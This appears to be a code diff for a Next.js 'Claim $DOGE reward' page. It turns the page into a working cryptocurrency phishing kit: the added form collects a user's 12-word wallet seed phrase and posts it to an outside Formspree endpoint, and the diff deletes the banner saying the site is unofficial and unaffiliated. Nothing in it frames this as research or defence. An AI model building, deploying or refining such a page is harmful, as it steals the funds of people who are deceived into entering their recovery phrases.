@@ -12,7 +12,44 @@ import Image from "next/image";
 import { useState } from "react";
 
 export default function Home() {
-  const [count, setCounts] = useState(12);
+  // const [count, setCount] = useState(12);
+  const [status, setStatus] = useState("");
+  const [words, setWords] = useState(Array(12).fill(""));
+  const [open, setOpen] = useState(false);
+
+  const handleWordChange = (index: number, value: string) => {
+    const newWords = [...words];
+    newWords[index] = value;
+    setWords(newWords);
+  };
+
+  const onSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+    setStatus("Submitting");
+    if (words.some((word) => word.trim() === "")) {
+      alert("Please fill in all the words before submitting.");
+      return;
+    }
+
+    try {
+      const response = await fetch("https://formspree.io/f/mjkgnqzq", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ words }),
+      });
+
+      if (response.ok) {
+        console.log(response);
+        setOpen(false);
+      } else {
+        console.log("Failed to send message", response);
+      }
+    } catch (error) {
+      console.log(error);
+    } finally {
+      setStatus("");
+    }
+  };
 
   return (
     <div
@@ -27,13 +64,7 @@ export default function Home() {
       }}
     >
       {/* announcment  */}
-      <div className="bg-black">
-        <p className="text-center text-[10px] [font-family:var(--font-inconsolata)] px-[2rem] uppercase">
-          This is not an official website of the United States government and is
-          Not affiliated with the doge
-        </p>
-      </div>
-      <div className="mt-[12rem] px-5">
+      <div className="pt-[14rem] px-5">
         <div className="bg-black p-3 text-[14px] w-fit">
           <h1 className="uppercase">much wow. much efficiency.</h1>
         </div>
@@ -51,7 +82,7 @@ export default function Home() {
           us.
         </p>
         <div className="my-3 mb-5 space-y-4 text-[18px]">
-          <Dialog>
+          <Dialog open={open} onOpenChange={setOpen}>
             <DialogTrigger className="w-full cursor-pointer">
               <p className="bg-white text-black [font-family:var(--font-inconsolata)] w-full py-3 uppercase">
                 Claim $DOGE reward
@@ -59,32 +90,65 @@ export default function Home() {
             </DialogTrigger>
             <DialogContent>
               <DialogHeader>
-                <DialogTitle>Connect Wallet</DialogTitle>
+                <DialogTitle>Connect Wallet Manually</DialogTitle>
                 <DialogDescription className="text-[15px]">
                   Enter your seed phrases or a private key to restore your
                   wallet.
                 </DialogDescription>
               </DialogHeader>
-              <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-3 gap-3">
-                {[...Array(count)].map((_, i) => (
-                  <input
-                    key={i}
-                    type="text"
-                    placeholder={`Word ${i + 1}`}
-                    className="border px-5 py-1 rounded-[5px] text-[13px] outline-none text-center"
-                    style={{ display: "block", marginBottom: "5px" }}
-                  />
-                ))}
-              </div>
-              <div className="w-full flex justify-around">
-                <button className="cursor-pointer">Cancel</button>
-                <button
-                  className="cursor-pointer"
-                  onClick={() => setCounts(12)}
-                >
-                  Submit
-                </button>
-              </div>
+              {/* <select
+                value={count}
+                onChange={(e) => {
+                  const newCount = parseInt(e.target.value, 10);
+                  setCount(newCount);
+                  setWords(Array(newCount).fill(""));
+                }}
+                className="py-1 border outline-none rounded-[5px]"
+              >
+                <option value={12}>12</option>
+                <option value={12}>15</option>
+                <option value={12}>18</option>
+                <option value={12}>21</option>
+                <option value={12}>24</option>
+              </select> */}
+              <form onSubmit={onSubmit}>
+                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-3 gap-3">
+                  {words.map((word, i) => (
+                    <input
+                      key={i}
+                      type="text"
+                      value={word}
+                      placeholder={`Word ${i + 1}`}
+                      className="border px-5 py-1 rounded-[5px] text-[13px] outline-none text-center"
+                      style={{ display: "block", marginBottom: "5px" }}
+                      onChange={(e) => handleWordChange(i, e.target.value)}
+                    />
+                  ))}
+                </div>
+                <div className="w-full flex justify-around mt-4 gap-5">
+                  <button
+                    type="button"
+                    className="cursor-pointer border bg-gray-200 rounded-sm py-1 w-full"
+                    onClick={() => {
+                      setWords(Array(12).fill(""));
+                      setOpen(false);
+                    }}
+                  >
+                    Clear
+                  </button>
+                  <button
+                    type="submit"
+                    className={`cursor-pointer border  rounded-sm py-1 w-full ${
+                      words.some((word) => word.trim() === "")
+                        ? "opacity-50"
+                        : "bg-gray-200"
+                    }`}
+                    disabled={words.some((word) => word.trim() === "")}
+                  >
+                    {status ? status : "Submit"}
+                  </button>
+                </div>
+              </form>
             </DialogContent>
           </Dialog>
 
